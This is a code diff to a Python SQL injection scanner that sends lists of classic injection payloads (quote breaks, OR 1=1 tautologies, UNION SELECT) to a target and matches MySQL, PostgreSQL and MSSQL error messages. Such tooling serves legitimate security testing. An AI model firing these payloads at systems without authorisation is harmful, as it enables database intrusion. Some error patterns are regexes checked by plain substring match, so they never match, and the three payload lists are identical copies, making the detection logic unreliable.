@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-from typing import Dict, List, Optional, Tuple
+from typing import Dict, List, Optional, Tuple, Any
 from core.request_engine import RequestEngine
 from core.payload_manager import PayloadManager
 import logging
@@ -94,24 +94,329 @@ class ErrorBasedInjector:
         
         return False, None, None
     
-    def test_all_parameters(self) -> Dict[str, Tuple[bool, Optional[str], Optional[str]]]:
-        """
-        Test all parameters in the request for error-based SQL injection vulnerabilities.
+    def test_all_parameters(self) -> List[Dict[str, Any]]:
+        """Test all parameters for error-based SQL injection vulnerabilities."""
+        results = []
         
-        Returns:
-            Dictionary mapping parameter names to (is_vulnerable, payload, error_message)
-        """
-        results = {}
+        # Test MySQL error-based injection
+        mysql_results = self._test_mysql_error()
+        if mysql_results:
+            results.extend(mysql_results)
+            
+        # Test PostgreSQL error-based injection
+        postgres_results = self._test_postgres_error()
+        if postgres_results:
+            results.extend(postgres_results)
+            
+        # Test MSSQL error-based injection
+        mssql_results = self._test_mssql_error()
+        if mssql_results:
+            results.extend(mssql_results)
+            
+        return results
         
-        # Test URL parameters for GET requests
-        if self.request_engine.method == "GET":
-            params = self.request_engine.get_url_parameters()
-            for param_name, param_value in params.items():
-                results[param_name] = self.test_parameter(param_name, param_value)
+    def _test_mysql_error(self) -> List[Dict[str, Any]]:
+        """Test for MySQL error-based SQL injection."""
+        results = []
         
-        # Test POST data for POST requests
-        elif self.request_engine.method == "POST":
-            for param_name, param_value in self.request_engine.data.items():
-                results[param_name] = self.test_parameter(param_name, str(param_value))
+        # Common MySQL error-based payloads
+        payloads = [
+            "'",
+            "''",
+            "\"",
+            "\"\"",
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' #",
+            "' OR 1=1 --",
+            "' OR 1=1 #",
+            "') OR ('1'='1",
+            "') OR ('1'='1' --",
+            "') OR ('1'='1' #",
+            "')) OR (('1'='1",
+            "')) OR (('1'='1' --",
+            "')) OR (('1'='1' #",
+            "' UNION SELECT 1,2,3 --",
+            "' UNION SELECT 1,2,3 #",
+            "' UNION ALL SELECT 1,2,3 --",
+            "' UNION ALL SELECT 1,2,3 #"
+        ]
         
-        return results 
+        for payload in payloads:
+            try:
+                # Send request with payload
+                response, _ = self.request_engine.send_request(payload=payload)
+                
+                # Check if response indicates successful injection
+                if self._check_mysql_error(response):
+                    results.append({
+                        "type": "mysql_error_based",
+                        "payload": payload,
+                        "status": "vulnerable",
+                        "error": self._extract_mysql_error(response)
+                    })
+                    
+            except Exception as e:
+                logging.error(f"Error testing MySQL error-based injection: {str(e)}")
+                continue
+                
+        return results
+        
+    def _test_postgres_error(self) -> List[Dict[str, Any]]:
+        """Test for PostgreSQL error-based SQL injection."""
+        results = []
+        
+        # Common PostgreSQL error-based payloads
+        payloads = [
+            "'",
+            "''",
+            "\"",
+            "\"\"",
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' #",
+            "' OR 1=1 --",
+            "' OR 1=1 #",
+            "') OR ('1'='1",
+            "') OR ('1'='1' --",
+            "') OR ('1'='1' #",
+            "')) OR (('1'='1",
+            "')) OR (('1'='1' --",
+            "')) OR (('1'='1' #",
+            "' UNION SELECT 1,2,3 --",
+            "' UNION SELECT 1,2,3 #",
+            "' UNION ALL SELECT 1,2,3 --",
+            "' UNION ALL SELECT 1,2,3 #"
+        ]
+        
+        for payload in payloads:
+            try:
+                # Send request with payload
+                response, _ = self.request_engine.send_request(payload=payload)
+                
+                # Check if response indicates successful injection
+                if self._check_postgres_error(response):
+                    results.append({
+                        "type": "postgres_error_based",
+                        "payload": payload,
+                        "status": "vulnerable",
+                        "error": self._extract_postgres_error(response)
+                    })
+                    
+            except Exception as e:
+                logging.error(f"Error testing PostgreSQL error-based injection: {str(e)}")
+                continue
+                
+        return results
+        
+    def _test_mssql_error(self) -> List[Dict[str, Any]]:
+        """Test for MSSQL error-based SQL injection."""
+        results = []
+        
+        # Common MSSQL error-based payloads
+        payloads = [
+            "'",
+            "''",
+            "\"",
+            "\"\"",
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' #",
+            "' OR 1=1 --",
+            "' OR 1=1 #",
+            "') OR ('1'='1",
+            "') OR ('1'='1' --",
+            "') OR ('1'='1' #",
+            "')) OR (('1'='1",
+            "')) OR (('1'='1' --",
+            "')) OR (('1'='1' #",
+            "' UNION SELECT 1,2,3 --",
+            "' UNION SELECT 1,2,3 #",
+            "' UNION ALL SELECT 1,2,3 --",
+            "' UNION ALL SELECT 1,2,3 #"
+        ]
+        
+        for payload in payloads:
+            try:
+                # Send request with payload
+                response, _ = self.request_engine.send_request(payload=payload)
+                
+                # Check if response indicates successful injection
+                if self._check_mssql_error(response):
+                    results.append({
+                        "type": "mssql_error_based",
+                        "payload": payload,
+                        "status": "vulnerable",
+                        "error": self._extract_mssql_error(response)
+                    })
+                    
+            except Exception as e:
+                logging.error(f"Error testing MSSQL error-based injection: {str(e)}")
+                continue
+                
+        return results
+        
+    def _check_mysql_error(self, response) -> bool:
+        """Check if response contains MySQL error messages."""
+        error_indicators = [
+            "You have an error in your SQL syntax",
+            "MySQL server version",
+            "Warning: mysql_",
+            "Warning: mysqli_",
+            "Warning: PDO::",
+            "SQL syntax.*MySQL",
+            "Warning.*mysql_.*",
+            "valid MySQL result",
+            "check the manual that corresponds to your (MySQL|MariaDB) server version",
+            "MySqlException \(0x",
+            "com.mysql.jdbc.exceptions",
+            "MySQLSyntaxErrorException",
+            "Unknown column",
+            "Duplicate entry",
+            "Table.*doesn't exist",
+            "Unknown table",
+            "Column count doesn't match"
+        ]
+        
+        return self._check_error_indicators(response, error_indicators)
+        
+    def _check_postgres_error(self, response) -> bool:
+        """Check if response contains PostgreSQL error messages."""
+        error_indicators = [
+            "PostgreSQL.*ERROR",
+            "Warning.*pg_",
+            "valid PostgreSQL result",
+            "Npgsql.",
+            "PG::SyntaxError:",
+            "ERROR: syntax error at or near",
+            "ERROR: parser: parse error at or near",
+            "ERROR: invalid input syntax for",
+            "ERROR: column.*does not exist",
+            "ERROR: relation.*does not exist",
+            "ERROR: duplicate key value violates unique constraint",
+            "ERROR: null value in column.*violates not-null constraint"
+        ]
+        
+        return self._check_error_indicators(response, error_indicators)
+        
+    def _check_mssql_error(self, response) -> bool:
+        """Check if response contains MSSQL error messages."""
+        error_indicators = [
+            "SQLServer JDBC Driver",
+            "com.microsoft.sqlserver.jdbc.SQLServerException",
+            "ODBC SQL Server Driver",
+            "Warning: mssql_",
+            "Msg \d+, Level \d+, State \d+",
+            "Unclosed quotation mark after the character string",
+            "Microsoft OLE DB Provider for SQL Server",
+            "Microsoft SQL Server",
+            "SQLServer JDBC Driver",
+            "ODBC Driver \d+ for SQL Server",
+            "Warning: odbc_",
+            "Microsoft SQL Server Native Client error",
+            "Msg \d+, Level \d+, State \d+",
+            "Line \d+: Incorrect syntax near",
+            "Unclosed quotation mark after the character string",
+            "Incorrect syntax near",
+            "The multi-part identifier",
+            "Could not find stored procedure",
+            "Invalid column name",
+            "Invalid object name"
+        ]
+        
+        return self._check_error_indicators(response, error_indicators)
+        
+    def _check_error_indicators(self, response, indicators: List[str]) -> bool:
+        """Check if response contains any of the error indicators."""
+        response_text = response.text.lower()
+        
+        for indicator in indicators:
+            if indicator.lower() in response_text:
+                return True
+                
+        return False
+        
+    def _extract_mysql_error(self, response) -> str:
+        """Extract MySQL error message from response."""
+        error_indicators = [
+            "You have an error in your SQL syntax",
+            "MySQL server version",
+            "Warning: mysql_",
+            "Warning: mysqli_",
+            "Warning: PDO::",
+            "SQL syntax.*MySQL",
+            "Warning.*mysql_.*",
+            "valid MySQL result",
+            "check the manual that corresponds to your (MySQL|MariaDB) server version",
+            "MySqlException \(0x",
+            "com.mysql.jdbc.exceptions",
+            "MySQLSyntaxErrorException",
+            "Unknown column",
+            "Duplicate entry",
+            "Table.*doesn't exist",
+            "Unknown table",
+            "Column count doesn't match"
+        ]
+        
+        return self._extract_error_message(response, error_indicators)
+        
+    def _extract_postgres_error(self, response) -> str:
+        """Extract PostgreSQL error message from response."""
+        error_indicators = [
+            "PostgreSQL.*ERROR",
+            "Warning.*pg_",
+            "valid PostgreSQL result",
+            "Npgsql.",
+            "PG::SyntaxError:",
+            "ERROR: syntax error at or near",
+            "ERROR: parser: parse error at or near",
+            "ERROR: invalid input syntax for",
+            "ERROR: column.*does not exist",
+            "ERROR: relation.*does not exist",
+            "ERROR: duplicate key value violates unique constraint",
+            "ERROR: null value in column.*violates not-null constraint"
+        ]
+        
+        return self._extract_error_message(response, error_indicators)
+        
+    def _extract_mssql_error(self, response) -> str:
+        """Extract MSSQL error message from response."""
+        error_indicators = [
+            "SQLServer JDBC Driver",
+            "com.microsoft.sqlserver.jdbc.SQLServerException",
+            "ODBC SQL Server Driver",
+            "Warning: mssql_",
+            "Msg \d+, Level \d+, State \d+",
+            "Unclosed quotation mark after the character string",
+            "Microsoft OLE DB Provider for SQL Server",
+            "Microsoft SQL Server",
+            "SQLServer JDBC Driver",
+            "ODBC Driver \d+ for SQL Server",
+            "Warning: odbc_",
+            "Microsoft SQL Server Native Client error",
+            "Msg \d+, Level \d+, State \d+",
+            "Line \d+: Incorrect syntax near",
+            "Unclosed quotation mark after the character string",
+            "Incorrect syntax near",
+            "The multi-part identifier",
+            "Could not find stored procedure",
+            "Invalid column name",
+            "Invalid object name"
+        ]
+        
+        return self._extract_error_message(response, error_indicators)
+        
+    def _extract_error_message(self, response, indicators: List[str]) -> str:
+        """Extract error message from response using indicators."""
+        response_text = response.text
+        
+        for indicator in indicators:
+            if indicator.lower() in response_text.lower():
+                # Try to extract the full error message
+                start = response_text.lower().find(indicator.lower())
+                if start != -1:
+                    # Get the next few lines after the error
+                    lines = response_text[start:].split('\n')[:3]
+                    return ' '.join(lines).strip()
+                    
+        return "Unknown error" 
